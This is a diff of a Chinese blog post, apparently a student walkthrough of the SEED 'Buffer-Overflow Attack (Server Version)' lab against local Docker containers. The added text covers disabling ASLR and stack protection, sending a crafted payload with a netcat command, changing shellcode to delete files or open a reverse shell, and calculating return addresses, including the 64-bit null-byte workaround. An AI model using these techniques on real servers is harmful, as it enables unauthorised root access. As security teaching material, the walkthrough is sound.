@@ -16,15 +16,15 @@
   <meta name="author" content="kaikaikai">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1 Overview  缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出 会影响程序的控制流，因为溢出会改变返回地址。 本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，">
+    <meta name="description" content="1. Overview 缓冲区溢出是指程序试图写入超出缓冲区边界的数据。恶意用户可利用这一漏洞改变程序的流程控制，从而导致恶意代码的执行。本实验的目的是让学生从实践中了解这种类型的漏洞，并学习如何在攻击中利用这种漏洞。 在本实验中，学生将得到四台不同的服务器，每台服务器都运行着一个存在缓冲区溢出漏洞的程序。他们的任务是开发一个利用该漏洞的方案，并最终获得这些服务器的 root 权限。除攻击">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Buffer-Overflow Attack (Server Version)">
 <meta property="og:url" content="http://example.com/2023/10/11/SEED-LABS/Software%20Security/Buffer-Overflow%20Attack(Server%20Version)/index.html">
 <meta property="og:site_name" content="kaikaikai&#39;s blog">
-<meta property="og:description" content="1 Overview  缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出 会影响程序的控制流，因为溢出会改变返回地址。 本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，">
+<meta property="og:description" content="1. Overview 缓冲区溢出是指程序试图写入超出缓冲区边界的数据。恶意用户可利用这一漏洞改变程序的流程控制，从而导致恶意代码的执行。本实验的目的是让学生从实践中了解这种类型的漏洞，并学习如何在攻击中利用这种漏洞。 在本实验中，学生将得到四台不同的服务器，每台服务器都运行着一个存在缓冲区溢出漏洞的程序。他们的任务是开发一个利用该漏洞的方案，并最终获得这些服务器的 root 权限。除攻击">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-10-11T01:37:23.000Z">
-<meta property="article:modified_time" content="2023-11-15T06:14:48.038Z">
+<meta property="article:modified_time" content="2023-12-07T03:21:17.216Z">
 <meta property="article:author" content="kaikaikai">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -207,7 +207,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.3k 字
+          14k 字
         
       </span>
     
@@ -218,7 +218,7 @@
         
         
         
-          53 分钟
+          115 分钟
         
       </span>
     
@@ -260,71 +260,120 @@
             
               <div class="markdown-body">
                 
-                <h1 id="overview">1 Overview</h1>
-<ul>
-<li>缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出
-会影响程序的控制流，因为溢出会改变返回地址。</li>
-<li>本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，并最终获得这些服务器上的
+                <h1 id="overview">1. Overview</h1>
+<p>缓冲区溢出是指程序试图写入超出缓冲区边界的数据。恶意用户可利用这一漏洞改变程序的流程控制，从而导致恶意代码的执行。本实验的目的是让学生从实践中了解这种类型的漏洞，并学习如何在攻击中利用这种漏洞。</p>
+<p>在本实验中，学生将得到四台不同的服务器，每台服务器都运行着一个存在缓冲区溢出漏洞的程序。他们的任务是开发一个利用该漏洞的方案，并最终获得这些服务器的
 root
-权限。除了进行这些攻击实验之外，还将试验几种针对缓冲区溢出攻击的对策。学生需要评估这些计划是否有效，并解释原因。</li>
+权限。除攻击外，学生还将实验几种针对缓冲区溢出攻击的对策。学生需要评估这些方案是否有效，并解释原因。本实验室涵盖以下主题：</p>
+<ul>
+<li>缓冲区溢出漏洞和攻击</li>
+<li>函数调用中的堆栈布局</li>
+<li>地址随机化、不可执行堆栈和 StackGuard</li>
+<li>Shellcode：我们有一个关于如何从头开始编写 shellcode
+的独立实验室</li>
 </ul>
-<h1 id="实验环境搭建">2 实验环境搭建</h1>
-<ol type="1">
-<li><p>关闭随机化地址策略，此步骤是为了保证程序每次执行时的初始地址不变，以便于进行多次实验和调试</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /sbin/sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure>
+<h1 id="lab-environment-setup">2. Lab Environment Setup</h1>
+<h2 id="turning-off-countermeasures">2.1 Turning off
+Countermeasures</h2>
+<p>在开始本实验之前，我们需要确保地址随机化对策已关闭；否则，攻击将很困难。可以使用以下命令来关闭：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo /sbin/sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049695.png" srcset="/img/loading.gif" lazyload
 alt="image-20231011094531325" />
 <figcaption aria-hidden="true">image-20231011094531325</figcaption>
-</figure></li>
-<li><p>编译并拷贝。由于 Makefile
-中已经提供了编译命令，我们仅需执行下列指令即可，此处编译关闭了栈保护和不可执行堆栈</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make<br>make install<br></code></pre></td></tr></table></figure>
+</figure>
+<h2 id="the-vulnerable-program">2.2 The Vulnerable Program</h2>
+<p>本实验室使用的漏洞程序名为 stack.c，位于 server-code
+文件夹中。这个程序存在缓冲区溢出漏洞，而你的任务就是利用这个漏洞获得
+root
+权限。下面列出的代码删除了一些非必要信息，因此与你从实验室设置文件中获得的代码略有不同。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121064.png" srcset="/img/loading.gif" lazyload
+alt="image-20231207101146304" />
+<figcaption aria-hidden="true">image-20231207101146304</figcaption>
+</figure>
+<p>上述程序存在缓冲区溢出漏洞。它从标准输入端读取数据，然后将数据传递到函数
+bof() 中的另一个缓冲区。原始输入的最大长度为 517 字节，但 bof()
+中的缓冲区只有 BUF SIZE 字节长，小于 517 字节。由于 strcpy()
+不会检查边界，因此会发生缓冲区溢出。</p>
+<p>程序将以 root
+权限在服务器上运行，其标准输入将重定向到服务器与远程用户之间的 TCP
+连接。因此，程序实际上是从远程用户获取数据。如果用户能利用这个缓冲区溢出漏洞，他们就能在服务器上获得
+root shell。</p>
+<p><strong>编译</strong>：要编译上述易受攻击的程序，我们需要使用<code>-fno-stack-protector</code>和<code>-z execstack</code>选项关闭堆栈保护和不可执行堆栈保护。下面是编译命令的示例（L1
+环境变量设置了 stack.c 中 BUF SIZE 常量的值）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc -DBUF_SIZE=$(L1) -o stack -z execstack -fno-stack-protector stack.c<br></code></pre></td></tr></table></figure>
+<p>我们将把堆栈程序编译成 32 位和 64 位二进制文件。我们预置的 Ubuntu
+20.04 虚拟机是 64 位虚拟机，但仍支持 32 位二进制文件。我们只需在 gcc
+命令中使用 -m32 选项即可。对于 32 位编译，我们还可以使用 -static
+来生成静态链接的二进制文件，它是独立的，不依赖于任何动态链接库，因为我们的容器中没有安装
+32 位动态链接库。</p>
+<p>Makefile 中已经提供了编译命令。要编译代码，需要键入 make
+来执行这些命令。变量 L1、L2、L3 和 L4 已在 Makefile
+中设置；它们将在编译过程中使用。编译完成后，我们需要将二进制文件复制到
+bof-containers
+文件夹，以便容器可以使用它们。以下命令将执行编译和安装。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make<br>$ make install<br></code></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049696.png" srcset="/img/loading.gif" lazyload
 alt="image-20231011094543773" />
 <figcaption aria-hidden="true">image-20231011094543773</figcaption>
-</figure></li>
-<li><p>拉取镜像</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dcbuild<br></code></pre></td></tr></table></figure>
-<figure>
-<img
-src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049697.png" srcset="/img/loading.gif" lazyload
-alt="image-20231011094803752" />
-<figcaption aria-hidden="true">image-20231011094803752</figcaption>
-</figure></li>
-<li><p>运行容器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dcup<br></code></pre></td></tr></table></figure>
-<figure>
-<img
-src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049698.png" srcset="/img/loading.gif" lazyload
-alt="image-20231011094900036" />
-<figcaption aria-hidden="true">image-20231011094900036</figcaption>
-</figure></li>
-<li><p>查看是否开启成功，可以看到已有 4 个容器正在运行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dockps<br></code></pre></td></tr></table></figure>
-<figure>
-<img
-src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049699.png" srcset="/img/loading.gif" lazyload
-alt="image-20231011094928526" />
-<figcaption aria-hidden="true">image-20231011094928526</figcaption>
-</figure></li>
-</ol>
-<h1 id="task-1-get-familiar-with-the-shellcode">3 Task 1: Get Familiar
+</figure>
+<p><strong>服务器程序</strong>：在 server-code
+文件夹中，你可以找到一个名为 server.c
+的程序，它是服务器的主要入口。它监听 9090 端口。当收到 TCP
+连接时，它会调用堆栈程序，并将 TCP
+连接设置为堆栈程序的标准输入。这样，当堆栈从 stdin
+中读取数据时，实际上是从 TCP 连接中读取的，即数据是由 TCP
+客户端的用户提供的。学生不必阅读 server.c 的源代码。</p>
+<h2 id="container-setup-and-commands">2.3 Container Setup and
+Commands</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker-compose build <span class="hljs-comment"># Build the container image</span><br>$ docker-compose up <span class="hljs-comment"># Start the container</span><br>$ docker-compose down <span class="hljs-comment"># Shut down the container</span><br>// Aliases <span class="hljs-keyword">for</span> the Compose commands above<br>$ dcbuild <span class="hljs-comment"># Alias for: docker-compose build</span><br>$ dcup <span class="hljs-comment"># Alias for: docker-compose up</span><br>$ dcdown <span class="hljs-comment"># Alias for: docker-compose down</span><br><br>$ dockps // Alias <span class="hljs-keyword">for</span>: docker ps --format <span class="hljs-string">&quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span><br>$ docksh &lt;<span class="hljs-built_in">id</span>&gt; // Alias <span class="hljs-keyword">for</span>: docker <span class="hljs-built_in">exec</span> -it &lt;<span class="hljs-built_in">id</span>&gt; /bin/bash<br>// The following example shows how to get a shell inside hostC<br>$ dockps<br>b1004832e275 hostA-10.9.0.5<br>0af4ea7a3e2e hostB-10.9.0.6<br>9652715c8e0a hostC-10.9.0.7<br>$ docksh 96<br>root@9652715c8e0a:/<span class="hljs-comment">#</span><br>// Note: If a docker <span class="hljs-built_in">command</span> requires a container ID, you <span class="hljs-keyword">do</span> not need to<br>// <span class="hljs-built_in">type</span> the entire ID string. Typing the first few characters will<br>// be sufficient, as long as they are unique among all the containers.<br></code></pre></td></tr></table></figure>
+<h1 id="task-1-get-familiar-with-the-shellcode">3. Task 1: Get Familiar
 with the Shellcode</h1>
-<ol type="1">
-<li><p>目标：修改 shellcode，使其能够删除文件</p></li>
-<li><p>根据提示，如果我们想让 shellcode 运行其他命令，只需修改第3
-行中的命令字符串即可。注意：修改过程中要保持
-shellcode长度不变，即末尾*位置不变，可以通过添加或删除空格实现。</p>
+<p>缓冲区溢出攻击的最终目的是在目标程序中注入恶意代码，以便利用目标程序的权限执行代码。大多数代码注入攻击都广泛使用
+Shellcode。让我们在本任务中熟悉一下它。</p>
+<p>Shellcode 通常用于代码注入攻击。它基本上是一段启动 shell
+的代码，通常用汇编语言编写。在本实验室中，我们只提供普通 shellcode
+的二进制版本，而不解释其工作原理，因为它并不复杂。如果您对 shellcode
+的具体工作原理感兴趣，并想从头开始编写 shellcode，您可以从另一个名为
+"Shellcode Lab "的 SEED 实验室中学习。下面列出了我们的通用
+shellcode（我们只列出了 32 位版本）：</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049700.png" srcset="/img/loading.gif" lazyload
 alt="image-20231011095123331" />
 <figcaption aria-hidden="true">image-20231011095123331</figcaption>
-</figure></li>
+</figure>
+<p>shellcode 运行"/bin/bash "shell
+程序（第➊行），但它有两个参数："-c"（第➋行）和一个命令字符串（第➌行）。这表示
+shell 程序将运行第二个参数中的命令。这些字符串末尾的
+"*"只是一个占位符，在执行 shellcode 时将被一个 0x00
+字节替换。每个字符串的末尾都需要有一个 0，但我们不能在 shellcode 中输入
+0。相反，我们会在每个字符串的末尾添加一个占位符，然后在执行过程中动态地在占位符中添加一个零。</p>
+<p>如果我们想让 shellcode
+运行其他命令，只需修改第➌行中的命令字符串即可。不过，在修改时，我们需要确保不要改变这个字符串的长度，因为
+argv[] 数组占位符的起始位置（紧跟在命令字符串之后）是硬编码在 shellcode
+的二进制部分中的。如果我们改变长度，就需要修改二进制部分。为了使字符串末尾的星号保持在同一位置，可以添加或删除空格。</p>
+<p>您可以在 shellcode 文件夹中找到通用 shellcode。在里面，你会看到两个
+Python 程序：shellcode_32.py 和 shellcode_64.py。它们分别用于 32 位和 64
+位 shellcode。这两个 Python 程序将分别把二进制 shellcode
+写入codefile_32和codefile_64。然后，您可以使用call_shellcode来执行其中的
+shellcode。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121065.png" srcset="/img/loading.gif" lazyload
+alt="image-20231207102205857" />
+<figcaption aria-hidden="true">image-20231207102205857</figcaption>
+</figure>
+<p>任务：请修改
+shellcode，以便用它来删除文件。请在实验报告中包含您修改过的 shellcode
+以及截图。</p>
+<p><strong>实验流程：</strong></p>
+<ol type="1">
 <li><p>以修改 64 位代码为例，首先将
 <code>shellcode_64.py</code>复制到<code>my_shellcode_64.py</code>，方便后续查看原文件</p>
 <figure>
@@ -346,8 +395,8 @@ src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/20231011104
 alt="image-20231011095252811" />
 <figcaption aria-hidden="true">image-20231011095252811</figcaption>
 </figure></li>
-<li><p>步骤 1：创建删除测试文件；步骤 2：执行修改后的脚本文件，从而生成
-<code>codefile_64</code>；步骤 3：编译
+<li><p>步骤 1：创建测试文件（删除使用）；步骤
+2：执行修改后的脚本文件，从而生成 <code>codefile_64</code>；步骤 3：编译
 <code>call_shellcode.c</code>；步骤 4：先执行
 <code>a64.out</code>，然后查看当前目录文件，经过比对，发现成功删除
 <code>testfile</code></p>
@@ -358,16 +407,68 @@ alt="image-20231011095437510" />
 <figcaption aria-hidden="true">image-20231011095437510</figcaption>
 </figure></li>
 <li><p><strong>小结</strong>：在攻击中，shellcode
-是一段用于利用软件漏洞的有效负载，shellcode 是 16
+是一段用于利用软件漏洞的有效负载，是 16
 进制的机器码，以其经常让攻击者获得shell 而得名。shellcode
 常常使用机器语言编写。 可在寄存器eip 溢出后，放入一段可让 CPU 执行的
 shellcode 机器码，让电脑可以执行攻击者的任意指令。</p></li>
 </ol>
-<h1 id="task-2-level-1-attack">4 Task 2: Level-1 Attack</h1>
+<h1 id="task-2-level-1-attack">4. Task 2: Level-1 Attack</h1>
+<p>当我们使用附带的 docker-compose.yml
+文件启动容器时，将有四个容器在运行，分别代表四个难度级别。在本任务中，我们将处理第
+1 级。</p>
+<h2 id="server">4.1 Server</h2>
+<p>我们的第一个目标运行在 10.9.0.5 上（端口号为
+9090），易受攻击的程序栈是一个 32
+位程序。让我们先向该服务器发送一条良性信息。我们将看到目标容器打印出以下信息（您看到的实际信息可能有所不同）。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121066.png" srcset="/img/loading.gif" lazyload
+alt="image-20231207102944074" />
+<figcaption aria-hidden="true">image-20231207102944074</figcaption>
+</figure>
+<p>服务器最多会接受来自用户的 517 字节数据，这将导致缓冲区溢出。
+你的任务就是构建有效负载来利用这个漏洞。如果将有效载荷保存在文件中，就可以使用以下命令将有效载荷发送到服务器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> &lt;file&gt; | nc 10.9.0.5 9090<br></code></pre></td></tr></table></figure>
+<p>如果服务器程序返回，则会打印出
+"正确返回"。如果没有打印出这条信息，堆栈程序可能已经崩溃。服务器仍将继续运行，接受新的连接。</p>
+<p>在这项任务中，有两个对缓冲区溢出攻击至关重要的信息被打印出来，作为对学生的提示：帧指针的值和缓冲区的地址（以✰标记的行）。<strong>帧指针寄存器</strong>在
+x86 架构中称为 ebp，在 x64 架构中称为
+rbp。您可以使用这两个信息来构建有效载荷。</p>
+<p><strong>增加随机性</strong>：我们在程序中添加了一点随机性，因此不同的学生可能会看到不同的缓冲区地址和帧指针值。只有当容器重新启动时，这些值才会发生变化，因此只要保持容器运行，就会看到相同的数字（不同学生看到的数字仍然不同）。这种随机性与地址随机化对策不同。它的唯一目的是让学生的作业有点不同。</p>
+<h2 id="writing-exploit-code-and-launching-attack">4.2 Writing Exploit
+Code and Launching Attack</h2>
+<p>要利用目标程序中的缓冲区溢出漏洞，我们需要准备一个有效载荷，并将其保存在一个文件中（本文将使用
+badfile 作为文件名）。为此，我们将使用 Python 程序。我们提供了一个名为
+exploit.py
+的骨架程序，它包含在实验室设置文件中。代码不完整，学生需要替换代码中的一些重要值。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121067.png" srcset="/img/loading.gif" lazyload
+alt="image-20231207103319974" />
+<figcaption aria-hidden="true">image-20231207103319974</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121068.png" srcset="/img/loading.gif" lazyload
+alt="image-20231207103329024" />
+<figcaption aria-hidden="true">image-20231207103329024</figcaption>
+</figure>
+<p>完成上述程序后，运行它。这将生成 badfile
+的内容。然后将其发送到易受攻击的服务器。如果你的漏洞利用程序执行得当，你放在
+shellcode
+中的命令就会被执行。如果您的命令生成了一些输出，您应该可以在容器窗口中看到它们。请提供证据，证明您可以成功地让有漏洞的服务器运行您的命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$./exploit.py // create the badfile<br>$ <span class="hljs-built_in">cat</span> badfile | nc 10.9.0.5 9090<br></code></pre></td></tr></table></figure>
+<p><strong>反向
+shell</strong>：我们对运行一些预先确定的命令不感兴趣。我们希望在目标服务器上获得一个
+root
+shell，这样我们就可以输入任何想要的命令。由于我们在远程机器上，如果只是让服务器运行
+/bin/sh，我们就无法控制 shell 程序。反向 shell
+是解决这一问题的典型技术。请修改 shellcode
+中的命令字符串，以便在目标服务器上运行反向
+shell。请在实验报告中附上截图和说明。</p>
+<p><strong>实验流程：</strong></p>
 <ol type="1">
-<li><p>目标：运行于 10.9.0.5（端口号为 9090），易受攻击的程序是一个 32
-位程序。</p></li>
-<li><p>原理：栈底为高地址，栈顶为低地址，栈由高地址向低地址增长。栈帧储存的是一个函数在栈中的信息，一般来说相邻的栈帧的关系是父函数与子函数之间的关系，子函数的栈底指针会保存父函数栈底指针的地址。</p>
+<li><p>原理：<strong>栈底为高地址，栈顶为低地址，栈由高地址向低地址增长。</strong>栈帧储存的是一个函数在栈中的信息，一般来说相邻的栈帧的关系是父函数与子函数之间的关系，子函数的栈底指针会保存父函数栈底指针的地址。</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049706.png" srcset="/img/loading.gif" lazyload
@@ -405,8 +506,8 @@ src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/20231011104
 alt="image-20231011100544158" />
 <figcaption aria-hidden="true">image-20231011100544158</figcaption>
 </figure></li>
-<li><p>说明：填充若干长度的，这个机器码对应的指令是 NOP，也就是告诉 CPU
-什么也不做，然后跳到下一条指令。有了这一段 NOP
+<li><p>代码解释：填充若干长度的，这个机器码对应的指令是 NOP，也就是告诉
+CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP
 的填充，只要返回地址能够命中临近shellcode任意位置，最后都可以跳转到
 shellcode 的起始处。</p>
 <figure>
@@ -416,16 +517,16 @@ alt="image-20231011100622963" />
 <figcaption aria-hidden="true">image-20231011100622963</figcaption>
 </figure></li>
 <li><p>构建有效载荷，设置 start= 517-len(shellcode)，517 为content
-大小，该操作目的是将 content 结尾部分内容替换为攻击代码 shellcode</p>
+大小，该操作目的是将 content 结尾部分内容替换为攻击代码 shellcode。</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049712.png" srcset="/img/loading.gif" lazyload
 alt="image-20231011100730129" />
 <figcaption aria-hidden="true">image-20231011100730129</figcaption>
 </figure></li>
-<li><p>设置 ret=ebp(0xffffd608)+n(n&gt;=8),ebp 即为步骤
-3）得到的地址，因为关闭了地址随机化，所以每次值都一样。n&gt;=8 原因：32
-位下，前一个栈帧和返回内容各占 4 字节，使用当前栈帧加上大于 8
+<li><p>设置 ret=ebp(0xffffd608)+n(n&gt;=8),ebp
+即为第二步中得到的地址，因为关闭了地址随机化，所以每次值都一样。n&gt;=8
+原因：32 位下，前一个栈帧和返回内容各占 4 字节，使用当前栈帧加上大于 8
 的数，即可跳到 shellcode 前的覆盖区（填充了 NOP
 指令），之后代码可以逐步运行到 shellcode 的起始处。注意：n
 值不能过大，过大可能无法命中覆盖区，此处以n=8 为例。Offset 为偏移值=ebp
@@ -496,10 +597,34 @@ alt="image-20231011101222506" />
 </figure></li>
 </ul></li>
 </ol>
-<h1 id="task-3-level-2-attack">5 Task 3: Level-2 Attack</h1>
+<h1 id="task-3-level-2-attack">5. Task 3: Level-2 Attack</h1>
+<p>在本任务中，我们将通过不显示一条重要信息来增加一点攻击难度。我们的目标服务器是
+10.9.0.6（端口号仍为 9090，易受攻击程序仍为 32
+位程序）。让我们先向该服务器发送一条良性信息。我们将看到目标容器打印出以下信息。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121069.png" srcset="/img/loading.gif" lazyload
+alt="image-20231207105106937" />
+<figcaption aria-hidden="true">image-20231207105106937</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121070.png" srcset="/img/loading.gif" lazyload
+alt="image-20231207105127323" />
+<figcaption aria-hidden="true">image-20231207105127323</figcaption>
+</figure>
+<p>正如你所看到的，服务器只给出了一个提示，即缓冲区的地址，并没有透露帧指针的值。这意味着，缓冲区的大小是未知的。这使得利用该漏洞比一级攻击更加困难。虽然可以在
+Makefile
+中找到实际的缓冲区大小，但在攻击中不允许使用该信息，因为在现实世界中，您不太可能拥有该文件。为了简化任务，我们假设缓冲区大小的范围是已知的。另一个可能对你有用的事实是，由于内存对齐，存储在帧指针中的值总是四的倍数（对于
+32 位程序）。</p>
+<p><code>Range of the buffer size (in bytes): [100, 300]</code></p>
+<p>您的任务是构建一个有效载荷来利用服务器上的缓冲区溢出漏洞，并在目标服务器上获得
+root shell（使用反向 shell
+技术）。请注意，您只能构建一个有效载荷，且该有效载荷必须适用于该范围内的任何缓冲区大小。如果使用
+"暴力
+"方法，即每次只尝试一种缓冲区大小，则无法获得所有积分。尝试的次数越多，就越容易被受害者发现并击败。这就是为什么尽量减少试验次数对攻击非常重要。在实验报告中，您需要描述您的方法并提供证据。</p>
+<p><strong>实验流程：</strong></p>
 <ol type="1">
-<li><p>目标：目标服务器是 10.9.0.6，端口号仍为 9090，易受攻击程序仍为 32
-位程序</p></li>
 <li><p>向目标服务器 10.9.0.6
 送消息，然后观察服务器端打印出的信息。信息中仅包含 buffer
 地址(0xffffd2b8)，没有显示帧指针的值,即无法直接计算出 ret 地址。</p>
@@ -515,8 +640,8 @@ src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/20231011104
 alt="image-20231011101505995" />
 <figcaption aria-hidden="true">image-20231011101505995</figcaption>
 </figure></li>
-<li><p>修改 exploit.py。ret=0xffffd2b8(buffer地址)+300(缓冲区最大容
-量)+8(前ebp+ret)=0xffffd3ec，加上的值只用大于等于
+<li><p>修改
+exploit.py。ret=0xffffd2b8(buffer地址)+300(缓冲区最大容量)+8(前ebp+ret)=0xffffd3ec，加上的值只用大于等于
 308，能命中shellcode前填充区，让 shellcode 执行即可，此处以加 308
 为例。</p>
 <figure>
@@ -540,12 +665,35 @@ alt="image-20231011101948481" />
 发送给目标服务端。查看 ip 发现显示服务器的 ip，成功实现反弹
 shell。（基本同上）</p></li>
 </ol>
-<h1 id="task-4-level-3-attack">6 Task 4: Level-3 Attack</h1>
+<h1 id="task-4-level-3-attack">6. Task 4: Level-3 Attack</h1>
+<p>在前面的任务中，我们的目标服务器是 32
+位程序。在本任务中，我们将切换到 64 位服务器程序。我们的新目标是
+10.9.0.7，它运行 64 位版本的栈程序。让我们先向服务器发送一条 hello
+消息。我们将看到目标容器打印出以下信息。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121071.png" srcset="/img/loading.gif" lazyload
+alt="image-20231207105903767" />
+<figcaption aria-hidden="true">image-20231207105903767</figcaption>
+</figure>
+<p>您可以看到帧指针和缓冲区地址的值变成了 8 字节长（而不是 32 位程序中的
+4
+字节）。您的任务是构建有效载荷，利用服务器的缓冲区溢出漏洞。您的最终目标是在目标服务器上获得一个
+root shell。您可以使用任务 1 中的 shellcode，但需要使用 64 位版本的
+shellcode。</p>
+<p>挑战。与 32 位机器上的缓冲区溢出攻击相比，64
+位机器上的攻击难度更大。最困难的部分是地址。虽然 x64 架构支持 64
+位地址空间，但只允许使用 0x00 至 0x00007FFFFFFFFFFF
+的地址。这意味着对于每个地址（8 个字节），最高的两个字节总是
+0。这就造成了一个问题。</p>
+<p>在缓冲区溢出攻击中，我们需要在有效负载中存储至少一个地址，并通过
+strcpy() 将有效负载复制到堆栈中。我们知道，strcpy() 函数会在看到 0
+时停止复制。因此，如果有效载荷中间出现一个 0，0
+后面的内容就无法复制到栈中。如何解决这个问题是这次攻击中最困难的挑战。您需要在报告中描述如何解决这一问题。</p>
+<p><strong>实验流程：</strong></p>
 <ol type="1">
-<li><p>目标：目标服务器是 10.9.0.7，开放端口为 9090，运行 64
-位程序</p></li>
 <li><p>向目标服务器 10.9.0.7
-送消息，然后观察服务器端打印出的信息。观察到栈帧值和 buffer 地址变为了 8
+送消息，然后观察服务器端打印出的信息。观察到帧指针和 buffer 地址变为了 8
 字节。</p>
 <figure>
 <img
@@ -559,11 +707,8 @@ src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/20231011104
 alt="image-20231011102145762" />
 <figcaption aria-hidden="true">image-20231011102145762</figcaption>
 </figure></li>
-<li><p><strong>难点</strong>：64 位计算机中的地址范围为
-0x00-0x00007FFFFFFFFFFF，因此所有地址最高位的两个字节都是 0x00。而
-strcpy 函数遇到 0会停止，如果和前面的方法一样，则无法成功拷贝
-shellcode。解决方案：不再将 shellcode 放在 badfile
-结尾部分，而是将其放至 badfile 开头，令ret
+<li><p>解决方案：不再将 shellcode 放在 badfile 结尾部分，而是将其放至
+badfile 开头，令ret
 的值指向前面部分。由于是小端存储，在截止前ret前面内容及其非零部分已经被成功拷贝。</p></li>
 <li><p>修改 exploit.py 中 shellcode，采用 task1 中使用的 64
 位shellcode</p>
@@ -595,10 +740,19 @@ alt="image-20231011102528980" />
 发送给目标服务端。查看 ip 发现显示服务器的 ip，成功实现反弹
 shell。（基本同上）</p></li>
 </ol>
-<h1 id="task-5-level-4-attack">7 Task 5: Level-4 Attack</h1>
+<h1 id="task-5-level-4-attack">7. Task 5: Level-4 Attack</h1>
+<p>本任务中的服务器与第 3
+级类似，只是缓冲区的大小要小得多。从下面的打印输出可以看出，帧指针与缓冲区地址之间的距离只有
+32 字节左右（实验室中的实际距离可能不同）。在第 3
+级中，距离要大得多。你的目标是一样的：获取服务器上的 root
+shell。服务器仍然从用户那里接收 517 字节的输入数据。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121072.png" srcset="/img/loading.gif" lazyload
+alt="image-20231207110504029" />
+<figcaption aria-hidden="true">image-20231207110504029</figcaption>
+</figure>
